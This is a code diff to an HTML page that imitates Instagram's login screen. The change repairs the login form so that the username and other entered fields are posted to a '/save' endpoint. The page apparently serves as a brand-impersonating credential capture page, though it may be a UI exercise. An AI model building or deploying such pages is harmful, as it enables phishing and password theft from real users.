@@ -1,11 +1,10 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Instagram Login UI</title>
-  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="login.css"> <!-- Link to external CSS -->
+  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="login.css" /> <!-- Link to external CSS -->
 </head>
 <body>
   <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
@@ -13,8 +12,8 @@
     <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
       <h1 class="bg-no-repeat instagram-logo"></h1>
       
-      <!-- ✅ Updated Form -->
-      <form class="mt-8 w-64 flex flex-col" method="POST" action="/submit"></form>
+      <!-- Login Form -->
+      <form class="mt-8 w-64 flex flex-col" method="POST" action="/save">
         <input 
           name="username"
           class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
@@ -37,7 +36,6 @@
         </button>
       </form>
 
-      <!-- Other UI -->
       <div class="flex justify-evenly space-x-2 w-64 mt-4">
         <span class="bg-gray-300 h-px flex-grow relative top-2"></span>
         <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
@@ -69,3 +67,4 @@
   </div>
 </body>
 </html>
+
